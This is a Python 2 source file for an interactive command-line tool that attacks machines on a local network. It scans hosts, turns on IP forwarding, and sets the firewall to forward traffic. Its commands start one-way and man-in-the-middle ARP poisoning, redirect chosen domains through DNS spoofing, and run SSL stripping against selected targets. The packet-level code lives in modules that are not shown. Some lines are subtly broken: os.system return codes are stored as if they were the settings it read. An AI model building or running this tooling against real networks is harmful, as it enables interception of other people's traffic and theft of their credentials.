from collections import defaultdict
import netifaces
import os

from hosts import get_hosts
from help_for import HelpFor


class CLI:

    commands   = {}
    params_all = {}
    params_mut = {}

    def __init__(self):

        # enable ip forwarding and store original value to reset upon exiting
        self.ip_forward = os.system("cat /proc/sys/net/ipv4/ip_forward")
        self.remove_line()
        os.system("sysctl -w net.ipv4.ip_forward=1")
        self.remove_line()

        # set ip forwarding to default accept
        self.ip_policy = os.system("iptables --list | grep FORWARD | sed 's/.*policy \([A-Z]*\).*/\1/'")
        os.system("iptables -P FORWARD ACCEPT")
        self.remove_line()

        # parameters based on default gateway
        self.interface = self.default_interface()
        self.range_    = self.default_range()
        self.own_mac   = self.default_mac()
        self.timeout   = 3

        # after scanning, hosts are stored in a list and gateway is stored separately
        self.hosts   = []
        self.gateway = None

        # add help functions
        self.help_for = HelpFor(self.commands, self.params_all, self.params_mut)

    # print a combination of control sequences to clear the last line
    def remove_line(self):
        print "\x1B[F\x1B[2K\x1B[F" 

    # main function: store user input in list and call specified command
    # e.g. input 'foo bar baz' calls "self.foo(['bar', 'baz'])"
    def prompt(self):

        try:
            args = raw_input(">>> ").split(' ')
            self.parse(args)

        except KeyboardInterrupt as _:
            self.quit_([])
    
    def parse(self, args):

        # obtain specified function from dict "commands" with key "args[0]" and call it
        try:
            self.commands[args[0]](self, args[1:])

        # if specified command "args[0]" is not recognized, "commands[args[0]]" will throw a KeyError
        except KeyError as _:
            print "E: Unknown command \"{}\"".format(args[0])
            self.prompt()

    ### functions for main commands ###

    # scan for hosts (and gateway) on local network
    def scan(self, args):

        # "get_hosts" function from file "hosts.py"
        self.gateway, self.hosts = get_hosts(self.interface, self.range_, self.timeout, self.gateway, self.hosts)
        
        # show found gateway ip or print warning message
        if self.gateway:
            self.show_gateway(None)

        else:
            print "W: No gateway found"

        # show found host ip's or print warning message
        if self.hosts:
            self.show_hosts(None)

        else:
            print "W: No hosts found"
        
        self.prompt()
        
    commands["scan"] = scan

    # easy access to terminal commands without having to quit
    # can even start a new terminal session with "os su"
    def os_(self, args):
        os.system(" ".join(args))
        self.prompt()

    commands["os"] = os_

    # stop all attacks and exit
    def quit_(self, _args):

        # stop all attacks
        for host in self.hosts:
            host.arp_stop()
            host.dns_stop()
        
        # reset ip forwarding
        os.system("sysctl -w net.ipv4.ip_forward={}".format(self.ip_forward))
        self.remove_line()
        os.system("iptables -P FORWARD {}".format(self.ip_policy))
        self.remove_line()
        
        exit()

    commands["quit"] = quit_

    # print specified parameter
    # e.g. "self.show(['bar', 'baz'])" calls "self.show_bar(['baz'])"
    def show(self, args):

        # obtain 'show' function for specified parameter from dict "params_all" with key "args[0]" and call it
        try:
            self.params_all[args[0]](self, args[1:])

        # if specified parameter "args[0]" is not recognized, "params[args[0]]" will throw a KeyError
        except KeyError as _:
            print "E: Unknown parameter \"{}\"".format(args[0])

        # if "args" is empty, no parameter is specified and "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No parameter specified"

        self.prompt()

    commands["show"] = show

    # set specified parameter
    # e.g. "self.set(['bar', 'baz'])" calls "self.set_bar(['baz'])"
    def set_(self, args):

        # obtain 'set' function for specified parameter from dict "params_mut" with key "args[0]" and call it
        try:
            self.params_mut[args[0]](self, args[1:])

        # if specified parameter "args[0]" is not recognized, "params[args[0]]" will throw a KeyError
        except KeyError as _:
            print "E: Unknown parameter \"{}\"".format(args[0])

        # if "args" is empty, no parameter is specified and "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No parameter specified"

        self.prompt()

    commands["set"] = set_

    # print help for specified command
    def help_(self, args):

        self.help_for(args)
        self.prompt()

    commands["help"] = help_

    def list_params(self, _args):

        self.help_for(["params"])
        self.prompt()

    commands["params"] = list_params

    ### show & set functions for specific parameters ###
    
    # simply print interface
    def show_interface(self, _args):
        print self.interface

    params_all["iface"]     = show_interface
    params_all["interface"] = show_interface

    # set "self.interface" to specified value or get default
    # also obtains "self.mac" and "self.range" automatically
    def set_interface(self, args):
        
        # set interface to specified value "args[0]", or default
        # mac and ip range will be different for another interface and are thus set automatically
        try:
            self.interface = self.default_interface() if args[0] == "default" else args[0]
            self.own_mac   = self.default_mac()
            self.range_    = self.default_range()

        # if "args" is empty, no value is specified and "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No value specified"
    
    params_mut["iface"]     = set_interface
    params_mut["interface"] = set_interface

    # return default network interface (interface of default gateway)
    def default_interface(self):
    
        # "netifaces.gateways()" returns a dictionary of available gateways, where "'default', netifaces.AF_INET" is the key to the default gateway (if found)
        # the format is then "(ip, interface)", so we retrieve the second element
        try:
            return netifaces.gateways()["default"][netifaces.AF_INET][1].encode("ascii")

        # generic error message
        except:
            print "E: Could not find default gateway. Configure manually if needed."

    # simply print own mac address
    def show_mac(self, _args):
        print self.own_mac

    params_all["mac"] = show_mac

    # manually configure own mac address
    def set_mac(self, args):
        self.own_mac = self.default_mac() if args[0] == "default" else args[0]

    params_mut["mac"] = set_mac

    # return own mac address on interface "self.interface"
    def default_mac(self):

        # "netifaces.ifaddresses(self.interface)" returns a dictionary of own network addresses, where "netifaces.AF_LINK" is the key to link layer addresses and "0,'addr'" retrieves own mac address
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]["addr"].encode("ascii")

        # generic error message
        except:
            print "E: Could not find own MAC address. Configure manually if needed"

    # simply print ip range of local network
    def show_range(self, _args):
        print self.range_

    params_all["range"] = show_range

    # manually configure ip range
    def set_range(self, args):

        try:
            self.range_ = self.default_range() if args[0] == "default" else args[0]

        # if "args" is empty, no value is specified and "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No value specified"

    params_mut["range"] = set_range

    # return ip range of local network
    def default_range(self):

        # "netifaces.ifaddresses(self.interface)" returns a dictionary of own network addresses, where "netifaces.AF_INET" is the key to ipv4 addresses and "0," retrieves own ip address
        try:
            addrs = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]
            return addrs["addr"] + "/" + addrs["netmask"]

        # generic error message
        except:
            print "E: Could not find default gateway. Configure manually if needed."

    # simply print timeout parameter for scanning
    def show_timeout(self, _args):
        print self.timeout

    params_all["timeout"] = show_timeout

    # set timeout parameter
    def set_timeout(self, args):

        # parse specified value as float and set "self.timeout"
        try:
            self.timeout = float(args[0])
        
        # if "args" is empty, no value is specified and "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: no value specified"

        # specified value "args[0]" cannot be parsed as float
        except:
            print "E: Could not parse input \"{}\" as number".format(args[0])

    params_mut["timeout"] = set_timeout

    # show gateway's ip address, obtained from scanning
    def show_gateway(self, _args):
        print "gateway at {}".format(self.gateway.ip)

    params_all["gateway"] = show_gateway

    # show hosts' (excluding gateway) ip addresses, obtained from scanning
    # also prints integers indexing hosts
    def show_hosts(self, _args):
        print "\n".join(["{}: host at {}".format(i, self.hosts[i].ip) for i in range(len(self.hosts))])

    params_all["hosts"] = show_hosts

    # show specified host's ip and mac address
    def show_host(self, args):
        
        try:
            print "host {}\nip: {}\nmac: {}".format(args[0], self.hosts[int(args[0])].ip, self.hosts[int(args[0])].mac)

        except KeyError as _:
            print "E: Host {} does not exist".format(args[0])

        except IndexError as _:
            print "E: No host specified"

    params_all["host"] = show_host

    ### commands for attacks ###

    # return target specified by argument
    def get_target(self, args):
        
        # return specified host
        try:
            return self.hosts[int(args[0])]

        # if no host is specified, "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No host specified"

        # input cannot be parsed as integer, try parsing as ip instead
        except ValueError as _:
            return self.get_target_from_addr(args)

        # if host does not exist, "self.hosts[...]" will throw an IndexError
        except KeyError as _:
            print "E: Host \"{}\" does not exist".format(args[0])

    # tries to return target specified by ip or mac address
    def get_target_from_addr(self, args):
        
        # return host with specified address, if it exists
        for host in self.hosts:
            if host.ip == args[0] or host.mac == args[0]:
                return host

        # no host with specified address can be found
        print "E: Host \"{}\" does not exist".format(args[0])

    # main arp command, calls subcommands 
    def arp(self, args):

        # obtain and call function specified by subcommand
        # e.g. "arp mitm foo" calls ".arp_mitm(['foo'])"
        try:
            self.commands[".arp_" + args[0]](self, args[1:])
        
        # if unknown command is specified, "self.commands['.arp_' + args[0]]" will throw a KeyError
        except KeyError as _:
            print "E: Unknown command \"arp {}\"".format(args[0])

        # if no command is specified, "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No command specified"

        self.prompt()

    commands["arp"] = arp

    # give a prompt to the user to specify addresses for one-way arp poisoning
    # not needed for mitm attack as the gateway is used there
    def arp_set_addrs(self):

        # user input
        try:
            ip_to_spoof  = raw_input("IP address to spoof (leave empty for gateway address): ")
            mac_to_spoof = raw_input("MAC address to lead to (leave emtpy for own address): ")
        
        except KeyboardInterrupt:
            return None, None

        # set "ip_to_spoof" to gateway ip if none specified
        if not ip_to_spoof:
            ip_to_spoof = self.gateway.ip

        # set "mac_to_spoof" to own mac if none specified
        if not mac_to_spoof:
            mac_to_spoof = self.own_mac

        return ip_to_spoof, mac_to_spoof

    # prepare and start one-way arp poisoning attack against specified host
    # addresses to spoof are obtained by a prompt
    def arp_oneway(self, args):

        target = self.get_target(args)

        # read: if specified target is found
        if target:

            ip_to_spoof, mac_to_spoof = self.arp_set_addrs()

            # do nothing on KeyboardInterrupt
            if ip_to_spoof:
                target.arp_oneway(ip_to_spoof, mac_to_spoof)
                target.arp_start()

    commands[".arp_oneway"] = arp_oneway

    # prepare and start man-in-the-middle arp poisoning attack agains specified host
    def arp_mitm(self, args):

        target = self.get_target(args)
        
        # read: if specified target is found
        if target:
            target.arp_mitm(self.gateway.ip, self.gateway.mac, self.own_mac)
            target.arp_start()

    commands[".arp_mitm"]   = arp_mitm

    # stops arp poisoning attack against specified host
    def arp_stop(self, args):

        if args[0] == "all":
            for target in self.hosts:
                target.arp_stop()

        else:

            target = self.get_target(args)

            # read: if specified target is found
            if target:
                target.arp_stop()

    commands[".arp_stop"]   = arp_stop

    # ensure that man-in-the-middle arp poisoning attack is running against specified host
    def arp_ensure_mitm(self, target):
        
        target.arp_ensure_mitm(self.gateway.ip, self.gateway.mac, self.own_mac)

    # restores the arp tables of the specified host to its pre-spoof state
    def arp_restore(self, args):
        
        target = self.get_target(args)

        if target:
            target.arp_restore(self.own_mac, self.gateway.ip, self.gateway.ip)

    commands[".arp_restore"]   = arp_restore

    # main dns command, calls subcommands
    def dns(self, args):

        # obtain and call function specified by subcommand
        # e.g. "dns poison foo" calls ".dns_poison(['foo'])"
        try: 
            self.commands[".dns_" + args[0]](self, args[1:])
    
        # if unknown command is specified, "self.commands['.dns_' + args[0]]" will throw a KeyError
        except KeyError as _:
            print "E: Unknown command \"dns {}\"".format(args[0])

        # if no command is specified, "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No command specified"

        self.prompt()

    commands["dns"] = dns

    # prompt user to add url and ip to spoof, use own ip by default
    def dns_add(self, args):

        target = self.get_target(args)

        # read: if specified target is found
        if target:

            # user input
            try:
                url_to_spoof = raw_input("URL to spoof: ")
                ip_to_spoof  = raw_input("IP address to lead to (leave empty for own address): ")

            except KeyboardInterrupt:
                return

            # if no ip is specified, use own ip
            if not ip_to_spoof:
                ip_to_spoof = self.range_.split('/')[0]

            target.dns_add(url_to_spoof, ip_to_spoof)

    commands[".dns_add"] = dns_add

    def dns_clean(self, args):

        target = self.get_target(args)

        # read: if specified target is found
        if target:
            
            target.dns_clean()

    commands[".dns_clean"] = dns_clean

    # set up and start dns poisoning attack against specified host
    def dns_start(self, args):

        target = self.get_target(args)

        # read: if specified target is found
        if target:
            self.arp_ensure_mitm(target)

            # start dns attack
            target.dns_start()

    commands[".dns_poison"] = dns_start

    # stop dns attack against specified host
    def dns_stop(self, args):
        
        if args[0] == "all":
            for target in self.hosts:
                target.dns_stop()

        else:

            target = self.get_target(args)

            # read: if specified target is found
            if target:
                target.dns_stop()

    commands[".dns_stop"] = dns_stop

    def dns_ensure(self, target):

        target.dns_ensure(self.ip)

    def ssl(self, args):

        # obtain and call function specified by subcommand
        # e.g. "dns poison foo" calls ".dns_poison(['foo'])"
        try: 
            self.commands[".ssl_" + args[0]](self, args[1:])
    
        # if unknown command is specified, "self.commands['.dns_' + args[0]]" will throw a KeyError
        except KeyError as _:
            print "E: Unknown command \"ssl {}\"".format(args[0])

        # if no command is specified, "args[0]" will throw an IndexError
        except IndexError as _:
            print "E: No command specified"

        self.prompt()

    commands["ssl"] = ssl

    # set up and start dns poisoning attack against specified host
    def ssl_start(self, args):

        target = self.get_target(args)

        if target:
            self.arp_ensure_mitm(target)

            # start dns attack
            target.ssl_start()

    commands[".ssl_strip"] = ssl_start

    def ssl_stop(self, args):
        
        if args[0] == "all":
            for target in self.hosts:
                target.ssl_stop()

        else:

            target = self.get_target(args)

            if target:
                target.ssl_stop()

    commands[".ssl_stop"] = ssl_stop

# create and start cli
if __name__ == "__main__":

    cli = CLI()
    cli.prompt()
